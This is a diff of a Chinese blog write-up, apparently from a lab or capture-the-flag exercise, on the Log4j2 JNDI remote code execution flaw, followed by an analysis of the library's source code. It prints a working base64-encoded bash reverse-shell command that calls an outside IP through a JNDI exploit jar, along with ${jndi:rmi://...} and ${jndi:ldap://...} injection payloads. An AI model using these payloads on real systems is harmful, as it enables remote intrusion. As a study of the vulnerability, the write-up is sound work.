+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}"  -A 124.220.233.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182154989.png" alt="image-20230729182154989"></p>
 <p>使用burpsuit抓包，替换payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">rmi://124.220.233.26:1099/29h4wg<br><br>${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230729182440231.png" alt="image-20230729182440231"></p>
+<pre class="line-numbers language-none"><code class="language-none">rmi://124.220.233.26:1099/29h4wg
+
+${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182440231.png" alt="image-20230729182440231"></p>
 <p>成功反弹shell</p>
-<p><img src="image-20230729182428974.png" alt="image-20230729182428974"></p>
-<p><img src="image-20230729182523042.png" alt="image-20230729182523042"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182428974.png" alt="image-20230729182428974"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230729182523042.png" alt="image-20230729182523042"></p>
 <p>找到flag</p>
 <h2 id="0x06-Log4j2源码浅析">0x06 Log4j2源码浅析</h2>
 <blockquote>
@@ -635,85 +689,169 @@
 </blockquote>
 <p>从上面的解释中我们可以看到Log4j2的功能十分强大，这里会简单分析其与漏洞相关联部分的源码实现，来更熟悉Log4j2的漏洞产生原因。</p>
 <p>我们使用maven来引入相关组件的2.14.0版本，在工程的pom.xml下添加如下配置，他会导入两个jar包(这里是跟着文章走的，暂时不实操了，用脑子复现一波)</p>
-<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230731180203568.png" alt="image-20230731180203568"></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731180203568.png" alt="image-20230731180203568"></p>
 <p>在工程目录resources下创建log4j2.xml</p>
-<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"error"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">appenders</span>&gt;</span><br><span class="hljs-comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Console</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Console"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"SYSTEM_OUT"</span> &gt;</span><br><span class="hljs-comment">&lt;!--            配置Console的模式布局--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">"%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n"</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Console</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">appenders</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">loggers</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">"error"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"Console"</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">loggers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appenders</span><span class="token punctuation">&gt;</span></span>
+<span class="token comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span>
+<span class="token comment">&lt;!--            配置Console的模式布局--&gt;</span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appenders</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>loggers</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>loggers</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>log4j2中包含两个关键组件<code>LogManager</code>和<code>LoggerContext</code>。<code>LogManager</code>是Log4J2启动的入口，可以初始化对应的<code>LoggerContext</code>。<code>LoggerContext</code>会对配置文件进行解析等其它操作。</p>
 <p>在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果</p>
-<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<span class="hljs-comment">//导入所需的包这里导入了 Apache Log4j 2.x 的 LogManager 和 Logger 类。</span><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-comment">//声明 Logger 对象，创建了一个静态的 Logger 对象 logger，使用 LogManager.getLogger() 方法初始化。</span><br><span class="hljs-comment">//Logger 对象用于记录日志。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">log4j2Rce2</span> {<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(log4j2Rce2.class);<br>    <span class="hljs-comment">//上述静态对象的初始化：创建一个 Logger 对象，并将其与当前的 log4j2Rce2 类关联起来，以便在该类中记录日志。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        String a=<span class="hljs-string">"${java:os}"</span>;<br>        logger.error(a);<br>    }<br>}<br><span class="hljs-comment">//在 main 方法中，定义了一个字符串变量 a 并赋值为 "${java:os}"。然后，使用 logger 的 error() 方法将字符串 a 记录为错误日志。</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230731180802075.png" alt="image-20230731180802075"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span><span class="token comment">//导入所需的包这里导入了 Apache Log4j 2.x 的 LogManager 和 Logger 类。</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
+
+<span class="token comment">//声明 Logger 对象，创建了一个静态的 Logger 对象 logger，使用 LogManager.getLogger() 方法初始化。</span>
+<span class="token comment">//Logger 对象用于记录日志。</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> log4j2Rce2 <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j2Rce2<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//上述静态对象的初始化：创建一个 Logger 对象，并将其与当前的 log4j2Rce2 类关联起来，以便在该类中记录日志。</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">String</span> a<span class="token operator">=</span><span class="token string">"${java:os}"</span><span class="token punctuation">;</span>
+        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token comment">//在 main 方法中，定义了一个字符串变量 a 并赋值为 "${java:os}"。然后，使用 logger 的 error() 方法将字符串 a 记录为错误日志。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731180802075.png" alt="image-20230731180802075"></p>
 <blockquote>
 <p>属性占位符之Interpolator插值器</p>
 </blockquote>
 <p>log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:<code>${prefix:key}</code>。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：</p>
-<p><img src="image-20230731181824461-1690798705020-1.png" alt="image-20230731181824461"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731181824461-1690798705020-1.png" alt="image-20230731181824461"></p>
 <p>详细信息可以查看<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">官方文档</a>。这些实现类存在于<code>org.apache.logging.log4j.core.lookup</code>包下。</p>
 <p>当参数占位符<code>${prefix:key}</code>带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符<code>${key}</code>没有prefix时，Interpolator则会从默认查找器中进行查询。如使用<code>${jndi:key}</code>时，将会调用<code>JndiLookup</code>的<code>lookup方法</code> 使用jndi(javax.naming)获取value。如下图演示。</p>
-<p><img src="image-20230731181943132.png" alt="image-20230731181943132"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731181943132.png" alt="image-20230731181943132"></p>
 <blockquote>
 <p>模式布局</p>
 </blockquote>
 <p>log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有<code>PatternLayout</code>，也就是我们在配置文件中<code>PatternLayout</code>字段所指定的属性<code>pattern</code>的值<code>%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n</code>。 <code>%msg</code>表示所输出的消息，其它格式化字符所表示的意义可以查看<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/layouts.html">官方文档</a>。</p>
-<p><img src="image-20230731182115294.png" alt="image-20230731182115294"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731182115294.png" alt="image-20230731182115294"></p>
 <p><code>PatternLayout</code>模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表。在配置文件<code>PatternLayout</code>标签的<code>pattern</code>属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过<code>PluginManager</code>收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。相关转换器名称注解和加载的插件实例如下图所示：</p>
-<p><img src="image-20230731182558351.png" alt="image-20230731182558351"></p>
-<p><img src="image-20230731182603989.png" alt="image-20230731182603989"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731182558351.png" alt="image-20230731182558351"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731182603989.png" alt="image-20230731182603989"></p>
 <p>本次漏洞关键在于转换器名称<code>msg</code>对应的插件实例为<code>MessagePatternConverter</code>对于日志中的消息内容处理存在问题，这部分是攻击者可控的。<code>MessagePatternConverter</code>会将日志中的消息内容为<code>${prefix:key}</code>格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。</p>
 <blockquote>
 <p>日志级别</p>
 </blockquote>
 <p>log4j2支持种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：<code>fatal(致命的), error, warn, info, debug, trace(堆栈)。</code> log4j2还定义了一个内置的标准级别<code>intLevel</code>，由数值表示，级别越高数值越小。</p>
-<p><img src="image-20230731183144121.png" alt="image-20230731183144121"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731183144121.png" alt="image-20230731183144121"></p>
 <p>当日志级别（调用）大于等于系统设置的<code>intLevel</code>的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中<code>&lt;root level="error"&gt;</code>值设置<code>intLevel</code>。当然我们也可以通过<code>Configurator.setLevel("当前类名", Level.INFO);</code>来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理：</p>
-<p><img src="1639729627000-1639496128233-image.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729627000-1639496128233-image.png" alt="img"></p>
 <h2 id="0x07-漏洞原理">0x07 漏洞原理</h2>
 <p>首先先来看一下网络上流传最多的payload</p>
-<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">${jndi:ldap:<span class="hljs-comment">//2lnhn2.ceye.io}</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">{</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">2l</span>nhn2<span class="token punctuation">.</span>ceye<span class="token punctuation">.</span>io<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>而触发漏洞的方法，大家都是以Logger.error()方法来进行演示，那这里我们也采用同样的方式来讲解，具体漏洞环境代码如下所示</p>
-<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Level;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.config.Configurator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4jTEst</span> {<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br><br>        <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Log4jTEst.class);<br><br>        logger.error(<span class="hljs-string">"${jndi:ldap://2lnhn2.ceye.io}"</span>);<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Level</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">Configurator</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jTEst</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Log4jTEst</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${jndi:ldap://2lnhn2.ceye.io}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>直击漏洞本源，将断点断在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>方法上，该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法。log4j2默认布局使用的是PatternLayout，如下图所示：</p>
-<p><img src="image-20230731184102645.png" alt="image-20230731184102645"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/image-20230731184102645.png" alt="image-20230731184102645"></p>
 <p>继续跟进在encode中会调用toText方法，根据注释，该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。</p>
-<p><img src="1639729628000-1639556483235-image.png" alt="img"></p>
-<p><img src="1639729628000-1639556642631-image.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639556483235-image.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639556642631-image.png" alt="img"></p>
 <p>接下来会调用<code>serializer.toSerializable</code>，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，</p>
-<p><img src="1639729628000-1639557107920-1.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639557107920-1.png" alt="img"></p>
 <p>这里整理了一下调用的Converter</p>
-<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.logging.log4j.core.pattern.DatePatternConverter<br>org.apache.logging.log4j.core.pattern.LiteralPatternConverter<br>org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter<br>org.apache.logging.log4j.core.pattern.LevelPatternConverter<br>org.apache.logging.log4j.core.pattern.LoggerPatternConverter<br>org.apache.logging.log4j.core.pattern.MessagePatternConverter  <span class="hljs-comment">//消息模式转换器</span><br>org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter<br>org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>DatePatternConverter</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>LiteralPatternConverter</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>ThreadNamePatternConverter</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>LevelPatternConverter</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>LoggerPatternConverter</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>MessagePatternConverter</span>  <span class="token comment">//消息模式转换器</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>LineSeparatorPatternConverter</span>
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">.</span></span>ExtendedThrowablePatternConverter</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟</p>
-<p><img src="1639729628000-1639557401374-2.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729628000-1639557401374-2.png" alt="img"></p>
 <p>在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符"{"，这三行代码中关键点在于最后一行</p>
-<p><img src="1639729629000-1639557496795-3.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639557496795-3.png" alt="img"></p>
 <p>这里我圈了几个重点，有助于理解Log4j2 为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io}<br></code></pre></td></tr></tbody></table></figure>
